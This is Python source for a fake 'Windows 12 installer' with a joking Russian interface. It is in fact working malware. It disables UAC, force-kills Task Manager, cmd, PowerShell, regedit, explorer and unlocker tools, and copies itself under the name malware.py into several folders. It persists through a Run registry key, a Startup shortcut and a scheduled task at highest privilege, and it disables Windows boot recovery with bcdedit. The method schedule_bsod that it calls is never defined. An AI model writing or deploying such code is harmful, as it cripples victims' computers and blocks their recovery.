import tkinter as tk
from tkinter import ttk
import os
import sys
import time
import winreg
import shutil
import subprocess
import win32api
import win32con
import win32security
import random
import json
import ctypes

# Требуем права администратора
def require_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
    except:
        return False

    print("This script requires administrative privileges.")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

require_admin()

class WindowsInstaller:
    def __init__(self, master):
        self.master = master
        master.title("Установщик Windows 12")
        master.geometry("600x400")

        self.create_widgets()
        self.get_disks()
        self.disable_uac()

    def create_widgets(self):
        # Заголовок
        title_label = tk.Label(self.master, text="Установщик Windows 12", font=("Arial", 24))
        title_label.pack(pady=20)

        # Выбор версии Windows
        version_frame = tk.LabelFrame(self.master, text="Выберите версию Windows 12")
        version_frame.pack(pady=10)

        self.version_var = tk.StringVar(value="home")

        ttk.Radiobutton(version_frame, text="Windows 12 Русификатор Edition ", variable=self.version_var, value="rofl").pack(anchor=tk.W)
        ttk.Radiobutton(version_frame, text="Windows 12 Home", variable=self.version_var, value="home").pack(anchor=tk.W)
        ttk.Radiobutton(version_frame, text="Windows 12 Pro", variable=self.version_var, value="pro").pack(anchor=tk.W)

        # Выбор диска (заглушка)
        disk_frame = tk.LabelFrame(self.master, text="Выбери диск для установки (если выберешь C: то костян лох)")
        disk_frame.pack(pady=10)

        self.disk_var = tk.StringVar()
        self.disk_dropdown = ttk.Combobox(disk_frame, textvariable=self.disk_var, state="readonly")
        self.disk_dropdown.pack()

        # Кнопка установки (заглушка)
        install_button = ttk.Button(self.master, text="Установить", command=self.show_agreement)
        install_button.pack(pady=20)

    def show_agreement(self):
        agreement_window = tk.Toplevel(self.master)
        agreement_window.title("Пользовательское соглашение")
        agreement_window.geometry("500x350")

        agreement_text = """
        Добро пожаловать в установщик Windows 12!

        Перед установкой, пожалуйста, ознакомьтесь с условиями пользовательского соглашения.

        1. Эта версия специально создана для Nedohackers Lite.
        2. Оно не является реальной операционной системой Windows 12 и не должно использоваться в производственных средах.
        3. Любое использование данного программного обеспечения, приводящее к потере данных, повреждению оборудования или другим нежелательным последствиям, является исключительной ответственностью пользователя.
        4. Автор не несет ответственности за любые прямые или косвенные убытки, возникшие в результате использования или невозможности использования данного программного обеспечения.
        5. Установка данного программного обеспечения не предоставляет никаких прав на лицензию реальной операционной системы Windows.
        6. Используя этот установщик, вы соглашаетесь с тем, что вы осознаете его фиктивный характер.

        Нажимая кнопку \"Принять\", вы подтверждаете свое согласие со всеми вышеизложенными условиями.
        """

        text_widget = tk.Text(agreement_window, wrap="word", height=15, width=60)
        text_widget.insert(tk.END, agreement_text)
        text_widget.config(state="disabled")
        text_widget.pack(pady=10)

        accept_button = ttk.Button(agreement_window, text="Принять", command=lambda: self.start_installation(agreement_window)) # заглушка, чтобы закрыть окно
        accept_button.pack(pady=10)

    def start_installation(self, agreement_window):
        agreement_window.destroy()
        print("Начинается установка...")
        self.jedi_visual_effects()
        self.block_tools()
        self.setup_persistence()
        self.schedule_bsod()
        self.disable_recovery_mode()
        self.show_message()

    # 1. Визуальные эффекты JEDI FX
    def jedi_visual_effects(self, duration=3): # duration in seconds
        start_time = time.time()
        initial_x = self.master.winfo_x()
        initial_y = self.master.winfo_y()

        def move_window():
            if time.time() - start_time < duration:
                offset_x = random.randint(-20, 20)
                offset_y = random.randint(-20, 20)
                new_x = initial_x + offset_x
                new_y = initial_y + offset_y
                self.master.geometry(f"600x400+{new_x}+{new_y}")
                self.master.after(50, move_window) # Move every 50 ms
            else:
                self.master.geometry(f"600x400+{initial_x}+{initial_y}") # Reset position

        move_window()

    # 2. Блокировка системных утилит
    def block_tools(self):
        tools = [
            "resmon", "taskmgr", "ProcessHacker.exe", "cmd.exe", "powershell.exe",
            "msconfig.exe", "regedit.exe", "explorer.exe", "SimpleUnlocker.exe"
        ]
        
        # Принудительное завершение процессов
        for tool in tools:
            subprocess.run(
                f'taskkill /f /im "{tool}"',
                shell=True,
                stderr=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL
            )
        
        # Имитация AppLocker через реестр
        try:
            key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Policies\Microsoft\Windows\SrpV2"
            )
            winreg.SetValueEx(key, "EnforcementMode", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except Exception:
            pass

    # 3. Настройка автозагрузки
    def setup_persistence(self):
        script_path = os.path.join(os.getenv('APPDATA'), 'malware.py')
        
        # Copying itself to multiple locations
        locations = [
            os.path.join(os.getenv('ProgramData'), 'malware.py'),
            os.path.join(os.getenv('TEMP'), 'malware.py'),
            os.path.join(os.path.expanduser('~'), 'Documents', 'malware.py')
        ]
        
        for location in locations:
            try:
                shutil.copyfile(__file__, location)
            except Exception:
                pass
        
        # Create a JSON file to track installation status
        status_file_path = os.path.join(os.getenv('APPDATA'), 'install_status.json')
        with open(status_file_path, 'w') as status_file:
            json.dump({"installation_complete": 0}, status_file)  # 0 means installation not complete

        # Adding to registry for auto-start
        self.add_to_registry()

        # Adding to Startup folder
        self.add_to_startup_folder(script_path)

        # Creating a scheduled task
        self.create_scheduled_task(script_path)

    def add_to_registry(self):
        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_WRITE
            ) as key:
                winreg.SetValueEx(
                    key,
                    "SystemHealth",
                    0,
                    winreg.REG_SZ,
                    f'pythonw.exe "{os.path.join(os.getenv("APPDATA"), "malware.py")}"'
                )
        except Exception:
            pass

    def add_to_startup_folder(self, script_path):
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_file_path = os.path.join(startup_folder, 'malware.lnk')

        # Create a shortcut to the script in the Startup folder
        if not os.path.exists(startup_file_path):
            import pythoncom
            import win32com.client

            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(startup_file_path)
            shortcut.TargetPath = script_path
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.save()

    def create_scheduled_task(self, script_path):
        schtasks_cmd = (
            f'schtasks /create /tn "SystemHealthTask" /sc onlogon /tr '
            f'"pythonw.exe \"{script_path}\"" /f /rl highest'
        )
        subprocess.run(schtasks_cmd, shell=True, capture_output=True)

    def check_auto_start(self):
        # Check if the application is in the registry
        self.check_registry()
        # Check if the application is in the Startup folder
        self.check_startup_folder()
        # Check if the scheduled task exists
        self.check_scheduled_task()

    def check_registry(self):
        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_READ
            ) as key:
                value, _ = winreg.QueryValueEx(key, "SystemHealth")
                if value != f'pythonw.exe "{os.path.join(os.getenv("APPDATA"), "malware.py")}"':
                    self.add_to_registry()
        except FileNotFoundError:
            self.add_to_registry()

    def check_startup_folder(self):
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_file_path = os.path.join(startup_folder, 'malware.lnk')
        if not os.path.exists(startup_file_path):
            self.add_to_startup_folder(os.path.join(os.getenv('APPDATA'), 'malware.py'))

    def check_scheduled_task(self):
        try:
            subprocess.run('schtasks /query /tn "SystemHealthTask"', shell=True, check=True)
        except subprocess.CalledProcessError:
            self.create_scheduled_task(os.path.join(os.getenv('APPDATA'), 'malware.py'))

    def check_installation_status(self):
        status_file_path = os.path.join(os.getenv('APPDATA'), 'install_status.json')
        try:
            with open(status_file_path, 'r') as status_file:
                status = json.load(status_file)
                if status.get("installation_complete") == 1:
                    self.start_installation(None)  # Call start_installation without GUI
                else:
                    self.show_agreement()  # Show the agreement window
        except Exception as e:
            print(f"Не удалось проверить статус установки: {e}")
            self.show_agreement()  # Fallback to showing the agreement

    def disable_uac(self):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system",
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            print("UAC успешно отключен. Для применения изменений требуется перезагрузка.")
        except Exception as e:
            print(f"Не удалось отключить UAC: {e}")

    def get_disks(self):
        drives = []
        for i in range(ord('A'), ord('Z') + 1):
            drive = chr(i) + ":/"
            if os.path.exists(drive):
                drives.append(drive)
        self.disk_dropdown['values'] = drives
        if drives:
            self.disk_var.set(drives[0])

    # 6. Отключение встроенного режима восстановления
    def disable_recovery_mode(self):
        try:
            subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True, check=True)
            subprocess.run("bcdedit /set {default} bootstatuspolicy ignoreallfailures", shell=True, check=True)
            print("Встроенный режим восстановления успешно отключен.")
        except subprocess.CalledProcessError as e:
            print(f"Не удалось отключить встроенный режим восстановления: {e}")

    def show_message(self):
        print("Имитация BSOD через 60 секунд после перезагрузки!")
        print("Для немедленной перезагрузки выполните: shutdown /r /t 0")

if __name__ == "__main__":
    root = tk.Tk()
    app = WindowsInstaller(root)
    app.check_installation_status()  # Check installation status on startup
    app.check_auto_start()  # Check and ensure auto-start entries
    root.mainloop()
